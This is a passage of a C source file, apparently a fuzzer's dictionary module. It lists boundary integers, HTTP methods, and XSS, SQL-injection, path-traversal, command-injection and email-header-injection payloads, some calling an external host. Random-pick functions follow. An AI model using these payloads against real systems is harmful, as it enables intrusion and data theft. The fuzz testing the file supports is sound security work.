"-9223372036854775778",
"-9223372036854775777",
"-9223372036854775776",
"-9223372036854775775",
"-9223372036854775774",
"-9223372036854775773",
"-9223372036854775772",
"-9223372036854775771",
"-9223372036854775770",
"-9223372036854775769",
"-9223372036854775768",
"-9223372036854775767",
"-9223372036854775766",
"-9223372036854775765",
"-9223372036854775764",
"-9223372036854775763",
"-9223372036854775762",
"-9223372036854775761",
"-9223372036854775760",
"-9223372036854775759",
"9223372036854775757",
"9223372036854775758",
"9223372036854775759",
"9223372036854775760",
"9223372036854775761",
"9223372036854775762",
"9223372036854775763",
"9223372036854775764",
"9223372036854775765",
"9223372036854775766",
"9223372036854775767",
"9223372036854775768",
"9223372036854775769",
"9223372036854775770",
"9223372036854775771",
"9223372036854775772",
"9223372036854775773",
"9223372036854775774",
"9223372036854775775",
"9223372036854775776",
"9223372036854775777",
"9223372036854775778",
"9223372036854775779",
"9223372036854775780",
"9223372036854775781",
"9223372036854775782",
"9223372036854775783",
"9223372036854775784",
"9223372036854775785",
"9223372036854775786",
"9223372036854775787",
"9223372036854775788",
"9223372036854775789",
"9223372036854775790",
"9223372036854775791",
"9223372036854775792",
"9223372036854775793",
"9223372036854775794",
"9223372036854775795",
"9223372036854775796",
"9223372036854775797",
"9223372036854775798",
"9223372036854775799",
"9223372036854775800",
"9223372036854775801",
"9223372036854775802",
"9223372036854775803",
"9223372036854775804",
"9223372036854775805",
"9223372036854775806",
"9223372036854775807",
"9223372036854775808",
"9223372036854775809",
"9223372036854775810",
"9223372036854775811",
"9223372036854775812",
"9223372036854775813",
"9223372036854775814",
"9223372036854775815",
"9223372036854775816",
"9223372036854775817",
"9223372036854775818",
"9223372036854775819",
"9223372036854775820",
"9223372036854775821",
"9223372036854775822",
"9223372036854775823",
"9223372036854775824",
"9223372036854775825",
"9223372036854775826",
"9223372036854775827",
"9223372036854775828",
"9223372036854775829",
"9223372036854775830",
"9223372036854775831",
"9223372036854775832",
"9223372036854775833",
"9223372036854775834",
"9223372036854775835",
"9223372036854775836",
"9223372036854775837",
"9223372036854775838",
"9223372036854775839",
"9223372036854775840",
"9223372036854775841",
"9223372036854775842",
"9223372036854775843",
"9223372036854775844",
"9223372036854775845",
"9223372036854775846",
"9223372036854775847",
"9223372036854775848",
"9223372036854775849",
"9223372036854775850",
"9223372036854775851",
"9223372036854775852",
"9223372036854775853",
"9223372036854775854",
"9223372036854775855",
"9223372036854775856",
"18446744073709551565",
"18446744073709551566",
"18446744073709551567",
"18446744073709551568",
"18446744073709551569",
"18446744073709551570",
"18446744073709551571",
"18446744073709551572",
"18446744073709551573",
"18446744073709551574",
"18446744073709551575",
"18446744073709551576",
"18446744073709551577",
"18446744073709551578",
"18446744073709551579",
"18446744073709551580",
"18446744073709551581",
"18446744073709551582",
"18446744073709551583",
"18446744073709551584",
"18446744073709551585",
"18446744073709551586",
"18446744073709551587",
"18446744073709551588",
"18446744073709551589",
"18446744073709551590",
"18446744073709551591",
"18446744073709551592",
"18446744073709551593",
"18446744073709551594",
"18446744073709551595",
"18446744073709551596",
"18446744073709551597",
"18446744073709551598",
"18446744073709551599",
"18446744073709551600",
"18446744073709551601",
"18446744073709551602",
"18446744073709551603",
"18446744073709551604",
"18446744073709551605",
"18446744073709551606",
"18446744073709551607",
"18446744073709551608",
"18446744073709551609",
"18446744073709551610",
"18446744073709551611",
"18446744073709551612",
"18446744073709551613",
"18446744073709551614",
"18446744073709551615",
"18446744073709551616",
"18446744073709551617",
"18446744073709551618",
"18446744073709551619",
"18446744073709551620",
"18446744073709551621",
"18446744073709551622",
"18446744073709551623",
"18446744073709551624",
"18446744073709551625",
"18446744073709551626",
"18446744073709551627",
"18446744073709551628",
"18446744073709551629",
"18446744073709551630",
"18446744073709551631",
"18446744073709551632",
"18446744073709551633",
"18446744073709551634",
"18446744073709551635",
"18446744073709551636",
"18446744073709551637",
"18446744073709551638",
"18446744073709551639",
"18446744073709551640",
"18446744073709551641",
"18446744073709551642",
"18446744073709551643",
"18446744073709551644",
"18446744073709551645",
"18446744073709551646",
"18446744073709551647",
"18446744073709551648",
"18446744073709551649",
"18446744073709551650",
"18446744073709551651",
"18446744073709551652",
"18446744073709551653",
"18446744073709551654",
"18446744073709551655",
"18446744073709551656",
"18446744073709551657",
"18446744073709551658",
"18446744073709551659",
"18446744073709551660",
"18446744073709551661",
"18446744073709551662",
"18446744073709551663",
"18446744073709551664",
"10",

//http
"OPTIONS",
"GET",
"HEAD",
"POST",
"PUT",
"DELETE",
"TRACE",
"TRACK",
"CONNECT",
"PROPFIND",
"PROPPATCH",
"MKCOL",
"COPY",
"MOVE",
"LOCK",
"UNLOCK",
"VERSION-CONTROL",
"REPORT",
"CHECKOUT",
"CHECKIN",
"UNCHECKOUT",
"MKWORKSPACE",
"UPDATE",
"LABEL",
"MERGE",
"BASELINE-CONTROL",
"MKACTIVITY",
"ORDERPATCH",
"ACL",
"PATCH",
"SEARCH",
"ARBITRARY",

//xss
"\\\';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode<script>alert(\'xss\')</script>",
"//--></SCRIPT>\">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
"\'\';!--\"<XSS>=&{()}",
"<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>",
"<IMG SRC=\"javascript:alert(\'XSS\');\">",
"<IMG SRC=javascript:alert(\'XSS\')>",
"<IMG SRC=javascrscriptipt:alert(\'XSS\')>",
"<IMG SRC=JaVaScRiPt:alert(\'XSS\')>",
"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
"<IMG SRC=\" &#14;  javascript:alert(\'XSS\');\">",
"<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
"<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
"<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
"\\\";alert(\'XSS\');//",
"</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
"<TABLE><TD BACKGROUND=\"javascript:alert(\'XSS\')\">",
"<DIV STYLE=\"background-image: url(javascript:alert(\'XSS\'))\">",
"<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029\">",
"<DIV STYLE=\"width: expression(alert(\'XSS\'));\">",

//sql
"\'",
"a\' or 1=1--",
"\"a\"\" or 1=1--\"",
" or a = a",
"a\' or \'a\' = \'a",
"1 or 1=1",
"a\' waitfor delay \'0:0:10\'--",
"1 waitfor delay \'0:0:10\'--",
"declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)",
"declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ",
"declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)",
"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)",
"a\'",
"?",
"\' or 1=1",
"? or 1=1 --",
"x\' AND userid IS NULL; --",
"x\' AND email IS NULL; --",
"anything\' OR \'x\'=\'x",
"x\' AND 1=(SELECT COUNT(*) FROM tabname); --",
"x\' AND members.email IS NULL; --",
"x' OR full_name LIKE \'%Bob%",
"23 OR 1=1",
"\'; exec master..xp_cmdshell \'ping 172.10.1.255\'--",
"\'",
"\'%20or%20\'\'=\'",
"\'%20or%20\'x\'=\'x",
"%20or%20x=x",
"\')%20or%20(\'x\'=\'x",
"0 or 1=1",
"\' or 0=0 --",
"\" or 0=0 --",
"or 0=0 --",
"\' or 0=0 #",
" or 0=0 #\"",
"or 0=0 #",
"\' or 1=1--",
"\" or 1=1--",
"\' or \'1\'=\'1\'--",
"\' or 1 --\'",
"or 1=1--",
"or%201=1",
"or%201=1 --",
"\' or 1=1 or \'\'=\'",
" or 1=1 or \"\"=",
"\' or a=a--",
" or a=a",
"\') or (\'a\'=\'a",
") or (a=a",
"hi or a=a",
"hi or 1=1 --\"",
"hi\' or 1=1 --",
"hi\' or \'a\'=\'a",
"hi\') or (\'a\'=\'a",
"\"hi\"\") or (\"\"a\"\"=\"\"a\"",
"\'hi\' or \'x\'=\'x\';",
"@variable",
",@variable",
"PRINT",
"PRINT @@variable",
"select",
"insert",
"as",
"or",
"procedure",
"limit",
"order by",
"asc",
"desc",
"delete",
"update",
"distinct",
"having",
"truncate",
"replace",
"like",
"handler",
"bfilename",
"\' or username like \'%",
"\' or uname like \'%",
"\' or userid like \'%",
"\' or uid like \'%",
"\' or user like \'%",
"exec xp",
"exec sp",
"\'; exec master..xp_cmdshell",
"\'; exec xp_regread",
"t\'exec master..xp_cmdshell \'nslookup www.google.com\'--",
"--sp_password",
"\\x27UNION SELECT",
"\' UNION SELECT",
"\' UNION ALL SELECT",
"\' or (EXISTS)",
"\' (select top 1",
"\'||UTL_HTTP.REQUEST",
"1;SELECT%20*",
"to_timestamp_tz",
"tz_offset",
"<>\"\'%;)(&+",
"\'%20or%201=1",
"%27%20or%201=1",
"%20$(sleep%2050)",
"%20\'sleep%2050'",
"char%4039%41%2b%40SELECT",
"&apos;%20OR",
"\'sqlattempt1",
"(sqlattempt2)",
"|",
"%7C",
"*|",
"%2A%7C",
"*(|(mail=*))",
"%2A%28%7C%28mail%3D%2A%29%29",
"*(|(objectclass=*))",
"%2A%28%7C%28objectclass%3D%2A%29%29",
"(",
"%28",
")",
"%29",
"&",
"%26",
"!",
"%21",
"\' or 1=1 or \'\'=\'",
"\' or \'\'=\'",
"x\' or 1=1 or \'x\'=\'y",
"/",
"//",
"//*",
"*/*",
"a\' or 3=3--",
"\"a\"\" or 3=3--\"",
"\' or 3=3",
"? or 3=3 --",

//fuzz
"xsstest",
"</foo>",
"../../../../../../../../../../etc/passwd",
"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
"))))))))))",
"|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
";id",
";echo 111111",

"\'--",
"\' or 1=1--",
"1 or 1=1--",
"\' or 1 in (@@version)--",
"1 or 1 in (@@version)--",
"\'; waitfor delay \'0:30:0\'--",
"1; waitfor delay \'0:30:0\'--",
"\'||Utl_Http.request(\'http://<yourservername>\') from dual--",
"1||Utl_Http.request(\'http://<yourservername>\') from dual--",
"xsstest",
"xsstest%00\"<>\'",
"</foo>",
"<foo></foo>",
"))))))))))",
"../../../../../../../../../../etc/passwd",
"../../../../../../../../../../boot.ini",
"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
"../../../../../../../../../../windows/win.ini",
"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
"|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
"| ping -i 30 127.0.0.1 |",
"| ping -n 30 127.0.0.1 |",
"& ping -i 30 127.0.0.1 &",
"& ping -n 30 127.0.0.1 &",
"; ping 127.0.0.1 ;",
"%0a ping -i 30 127.0.0.1 %0a",
"`ping 127.0.0.1`",
"| id",
"& id",
"; id",
"%0a id %0a",
"`id`",
";echo 111111",
"echo 111111",
"response.write 111111",
":response.write 111111",
"http://<yourservername>/",
"<youremail>%0aCc:<youremail>",
"<youremail>%0d%0aCc:<youremail>",
"<youremail>%0aBcc:<youremail>",
"<youremail>%0d%0aBcc:<youremail>",
"%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a",
"%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a",

};

int stringStaticLen = sizeof(stringStatic)/sizeof(stringStatic[0]);


int numberDict[]=
{
12345,
88888,
0xfffffff8,
0x80000000,
0x467893,
4578932,

};

int numberDictLen = sizeof(numberDict)/sizeof(numberDict[0]);

char* stringDict[]=
{
"12345",
"88888",
"0xfffffff8",
"chounmizadi",

};

int stringDictLen = sizeof(stringDict)/sizeof(stringDict[0]);

char* blobDict[]=
{
"\x12\x00\x34\x05",
"88888",
"0xfffffff8",
};

int blobDictLength[]=
{
4,
5,
10,
};


int blobDictLen = sizeof(blobDict)/sizeof(blobDict[0]);

u64 dict_GetNumber(void)
{
	return numberDict[PL_random()%numberDictLen];
}

void dict_GetStatic(char** blob,int *len)
{
	int pos = PL_random()% stringStaticLen;

	*blob = stringStatic[pos];
	*len = (int)lib_strlen(stringStatic[pos]);

	int temp = PL_random()% 3;

	//�ٷ�֮30���ʼ�0
	if (temp == 0)
		*len = *len + 1;
	return;
}

void dict_GetString(char** blob,int *len)
{
	int pos = PL_random()% stringDictLen;

	*blob = stringDict[pos];
	*len = (int)lib_strlen(stringDict[pos]);

	int temp = PL_random()% 3;

	//�ٷ�֮30���ʼ�0
	if (temp == 0)
		*len = *len + 1;
	return;
}

void dict_GetBlob(char** blob,int *len)
{
	int pos = PL_random()% blobDictLen;

	*blob = blobDict[pos];
	*len = blobDictLength[pos];
	
	return;
}


#ifdef __cplusplus
}
#endif
